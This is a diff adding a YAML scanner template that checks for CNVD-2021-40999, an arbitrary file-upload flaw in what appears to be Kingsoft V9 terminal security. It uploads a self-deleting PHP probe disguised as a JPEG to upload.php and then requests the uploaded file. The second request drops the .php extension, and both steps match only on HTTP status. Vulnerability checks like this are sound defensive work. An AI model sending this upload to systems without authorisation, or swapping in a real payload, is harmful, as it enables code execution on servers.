@@ -1,0 +1,40 @@
+id: yaml-poc-ejinshan-zdv9-file_upload-CNVD-2021-40999
+info:
+  name: Yaml Poc Ejinshan Zdv9 File_Upload Cnvd 2021 40999
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-ejinshan-zdv9-file_upload-CNVD-2021-40999'
+  tags: fileupload
+  reference:
+  - https://forum.butian.net/share/76
+http:
+- method: POST
+  path:
+  - /tools/manage/upload.php
+  body: '------{{rBoundary}}
+
+    Content-Disposition: form-data; name="file"; filename="{{rFilename}}.php"
+
+    Content-Type: image/jpeg
+
+
+    <?php echo md5({{r1}});unlink(__FILE__);?>
+
+    ------{{rBoundary}}--'
+  headers:
+    Content-Type: multipart/form-data; boundary=----{{rBoundary}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /uploaddir/{{rFilename}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
